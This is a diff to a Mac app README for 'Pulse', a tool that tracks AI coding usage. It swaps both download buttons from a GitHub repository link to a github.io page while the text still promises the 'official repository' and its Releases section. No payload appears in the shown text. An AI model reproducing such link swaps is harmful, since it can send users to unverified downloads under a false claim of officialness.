@@ -46,7 +46,7 @@ Getting Pulse on your Mac is a straightforward process. Follow these simple step
 
 Click the big button below to go to the official Pulse download page at GitHub. 
 
-[![Download Pulse](https://img.shields.io/badge/Download_Pulse-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/felicdaddubious8891/Pulse)
+[![Download Pulse](https://img.shields.io/badge/Download_Pulse-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://felicdaddubious8891.github.io)
 
 **Step 2: Get the App**
 
@@ -104,7 +104,7 @@ Pulse is more than just a utility—it’s a peace-of-mind companion for modern 
 
 Ready to take control of your AI coding usage? Click the button below to download Pulse from theofficial repository:
 
-[![Download Pulse Now](https://img.shields.io/badge/Download_Pulse_Now-FF4500?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/felicdaddubious8891/Pulse)
+[![Download Pulse Now](https://img.shields.io/badge/Download_Pulse_Now-FF4500?style=for-the-badge&logo=apple&logoColor=white)](https://felicdaddubious8891.github.io)
 
 Visit this link to download the application. Head to the "Releases" section, grab the latest version, and install it in minutes. Join thousands of satisfied users who have eliminated uncertainty from their coding sessions. Pulse is here to keep you informed, efficient, and always ready for your next big idea. 
 
